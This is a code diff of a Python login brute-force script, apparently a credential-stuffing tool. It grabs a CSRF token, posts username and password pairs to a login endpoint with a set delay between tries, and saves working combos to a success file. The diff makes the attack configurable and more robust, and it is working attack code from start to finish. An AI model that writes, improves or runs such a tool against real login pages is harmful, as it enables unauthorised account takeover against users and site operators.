@@ -2,8 +2,16 @@ import time
 import requests
 from typing import Optional, Set
 from bs4 import BeautifulSoup
-from settings import LOGIN_PAGE, LOGIN_POST, SUCCESS_FILE_PATH
-from utils.files_utils import save_to_file
+from utils.files_read_write_utils import save_to_file
+from settings import (
+                      LOGIN_PAGE,
+                      LOGIN_POST,
+                      SUCCESS_FILE_PATH,
+                      PASSWORD_PARAM_STRING,
+                      LOGIN_PARAM_STRING,
+                      CSRF_PARAM_STRING,
+                      DELAY_BETWEEN_REQUESTS
+                  )
 
 
 def create_session() -> Optional[requests.Session]:
@@ -59,36 +67,45 @@ def get_csrf_token(session: requests.Session) -> Optional[str]:
 def try_login(
     session: requests.Session, known_success: Set[str], username: str, password: str
 ) -> bool:
-    """
-    Attempts to log in using a username, password, and optional CSRF token.
+    """Attempt to log in with given credentials.
 
     Args:
         session (requests.Session): Active HTTP session.
-        known_success (Set[str]): Set of already successful username:password combinations.
-        username (str): The username to try.
-        password (str): The password to try.
+        known_success (Set[str]): Set of successful username:password combos.
+        username (str): Username to try.
+        password (str): Password to try.
 
     Returns:
-        bool: True if login was successful, False otherwise.
+        bool: True if login successful, False otherwise.
     """
-    data = {"login": username, "password": password}
+    data = {LOGIN_PARAM_STRING: username, PASSWORD_PARAM_STRING: password}
     csrf_token = get_csrf_token(session)
     if csrf_token:
-        data["csrf_token"] = csrf_token
+        data[CSRF_PARAM_STRING] = csrf_token
 
     try:
-        start = time.time()
         resp = session.post(LOGIN_POST, data=data)
-        time.sleep(1 + (time.time() - start) * 0.5)
+        time.sleep(DELAY_BETWEEN_REQUESTS)
 
-        if resp.json().get("error") == False:
+        if resp.status_code != 200:
+            print(f"[!] Unexpected status {resp.status_code} for {username}:{password}")
+            return False
+
+        try:
+            response_json = resp.json()
+        except ValueError:
+            print(f"[!] Non-JSON response for {username}:{password}")
+            return False
+
+        if response_json.get("error") is False:
             combo = f"{username}:{password}"
             if combo not in known_success:
                 save_to_file(SUCCESS_FILE_PATH, combo)
                 known_success.add(combo)
             print(f"[+] Success: {combo}")
             return True
+
         print(f"[-] Failed: {username}:{password}")
     except Exception as e:
-        print(f"[!] Response error: {e}")
+        print(f"[!] Response error for {username}:{password} -> {e}")
     return False
